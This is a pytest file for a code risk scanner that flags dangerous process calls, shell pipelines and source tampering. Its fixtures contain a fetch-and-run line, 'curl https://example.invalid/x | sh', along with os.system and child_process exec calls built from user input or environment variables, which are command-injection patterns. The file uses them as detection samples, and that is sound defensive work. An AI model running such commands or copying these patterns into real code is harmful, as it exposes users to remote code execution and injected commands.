from pathlib import Path

from scanners.risk_scanner.analyzers import analyze_snapshot
from scanners.risk_scanner.analyzers.javascript_ast import analyze_javascript
from scanners.risk_scanner.analyzers.manifest_analysis import (
    get_field,
    parse_structured_document,
)
from scanners.risk_scanner.analyzers.shell_analysis import analyze_shell
from scanners.risk_scanner.analyzers.source_integrity import (
    capture_source_state,
    verify_source_state,
)
from scanners.risk_scanner.inventory import build_inventory
from scanners.risk_scanner.policy import ScanPolicy
from scanners.risk_scanner.scanner import RiskScanner


def test_python_ast_facts_are_shared_with_capability_graph(tmp_path: Path) -> None:
    source = "import os as operating_system\noperating_system.system('id')\n"
    path = tmp_path / "main.py"
    path.write_text(source, encoding="utf-8")
    inventory = build_inventory(tmp_path, ScanPolicy())
    snapshot = analyze_snapshot(
        {"main.py": source}, ["main.py"], {"permissions": {}},
        target_dir=tmp_path, inventory=inventory,
    )

    event = snapshot.python_ast["main.py"].calls[0]
    assert event.kind == "dangerous"
    assert event.resolved == "os.system"
    assert "process" in snapshot.capability_graph.as_report()["observed"]


def test_javascript_and_shell_analysis_extract_commands() -> None:
    javascript = analyze_javascript(
        "server.js",
        "const cp = require('child_process');\ncp.exec('whoami');\n",
    )
    assert javascript.calls[0].calling == "cp.exec"
    assert javascript.calls[0].kind == "process"

    shell = analyze_shell("install.sh", "curl https://example.invalid/x | sh\n")
    assert shell.commands[0].argv[:2] == ("curl", "https://example.invalid/x")
    assert shell.commands[0].pipeline is True


def test_javascript_process_analysis_marks_environment_driven_shell() -> None:
    javascript = analyze_javascript(
        "server.cjs",
        "cp.exec(process.env.BRAINSTORM_OPEN_CMD + ' ' + url);\n",
    )

    event = javascript.calls[0]
    assert event.kind == "process"
    assert event.dynamic is True
    assert event.input_source == "environment"
    assert event.shell_capable is True


def test_javascript_process_analysis_marks_variable_command_dynamic() -> None:
    javascript = analyze_javascript(
        "server.cjs",
        "cp.exec(command);\n",
    )

    event = javascript.calls[0]
    assert event.dynamic is True
    assert event.input_source == "variable"
    assert event.shell_capable is True


def test_javascript_process_analysis_marks_concatenated_command_dynamic() -> None:
    javascript = analyze_javascript(
        "server.cjs",
        "cp.exec('prefix ' + userInput);\n",
    )

    event = javascript.calls[0]
    assert event.dynamic is True


def test_javascript_process_analysis_balances_nested_parentheses() -> None:
    javascript = analyze_javascript(
        "server.cjs",
        "cp.exec(buildCommand('prefix)', userInput));\n",
    )

    event = javascript.calls[0]
    assert event.dynamic is True
    assert event.input_source == "user_input"


def test_javascript_process_analysis_matches_same_line_call_by_column() -> None:
    javascript = analyze_javascript(
        "server.cjs",
        "cp.exec('fixed'); cp.exec(userInput);\n",
    )

    assert len(javascript.calls) == 2
    assert javascript.calls[0].dynamic is False
    assert javascript.calls[1].dynamic is True


def test_javascript_process_analysis_keeps_snapshot_line_context() -> None:
    javascript = analyze_javascript(
        "server.cjs",
        "const cp = require('child_process');\r\r\n"
        "cp.exec(process.env.OPEN_CMD + ' ' + url);\r\r\n",
    )

    event = javascript.calls[0]
    assert event.line == 2
    assert event.dynamic is True
    assert event.input_source == "environment"


def test_structured_manifest_reads_fields_without_regex() -> None:
    document = parse_structured_document(
        "manifest.json",
        '{"permissions":{"network":{"allowed":true}},"type":"skill"}',
    )
    assert get_field(document.data, "permissions.network.allowed") is True
    assert get_field(document.data, "missing.field") is None


def test_malformed_yaml_is_a_recoverable_structured_parse_error() -> None:
    document = parse_structured_document("broken.yaml", "items: [")

    assert document.data is None
    assert document.error is not None
    assert "invalid yaml" in document.error


def test_source_integrity_detects_mutation_and_new_file(tmp_path: Path) -> None:
    target = tmp_path / "main.py"
    target.write_text("print(1)\n", encoding="utf-8")
    inventory = build_inventory(tmp_path, ScanPolicy())
    snapshot = capture_source_state(tmp_path, inventory)
    target.write_text("print(123456)\n", encoding="utf-8")
    (tmp_path / "added.py").write_text("print(2)\n", encoding="utf-8")

    issues = verify_source_state(tmp_path, snapshot)
    kinds = {issue["kind"] for issue in issues}
    assert "source_changed_during_scan" in kinds
    assert "source_added_during_scan" in kinds


def test_source_integrity_recheck_uses_bounded_inventory(tmp_path: Path) -> None:
    (tmp_path / "a.py").write_text("print(1)\n", encoding="utf-8")
    (tmp_path / "b.py").write_text("print(2)\n", encoding="utf-8")
    policy = ScanPolicy(max_files=1)
    inventory = build_inventory(tmp_path, policy)
    snapshot = capture_source_state(tmp_path, inventory)

    issues = verify_source_state(tmp_path, snapshot)

    assert any(issue["kind"] == "source_state_check_limited" for issue in issues)


def test_limited_source_state_check_is_not_a_risk_finding(tmp_path: Path) -> None:
    (tmp_path / "a.py").write_text("print(1)\n", encoding="utf-8")
    (tmp_path / "b.py").write_text("print(2)\n", encoding="utf-8")

    report = RiskScanner(tmp_path, policy=ScanPolicy(max_files=1)).scan()

    assert "source_state_check_limited" in report["scan_limits"]["exceeded"]
    assert "source_state_check_limited" in report["scan_status"]["reasons"]
    assert not any(
        finding["title"] == "源码完整性异常: source_state_check_limited"
        for finding in report["findings"]
    )


def test_parser_failure_is_a_partial_scan_signal(tmp_path: Path) -> None:
    (tmp_path / "SKILL.md").write_text("# skill\n", encoding="utf-8")
    (tmp_path / "broken.py").write_text("def broken(:\n", encoding="utf-8")

    report = RiskScanner(tmp_path).scan()

    assert report["structural_analysis"]["parse_errors"] == 1
    assert report["scan_status"]["state"] == "partial"
    assert "structured_analysis_errors" in report["scan_status"]["reasons"]
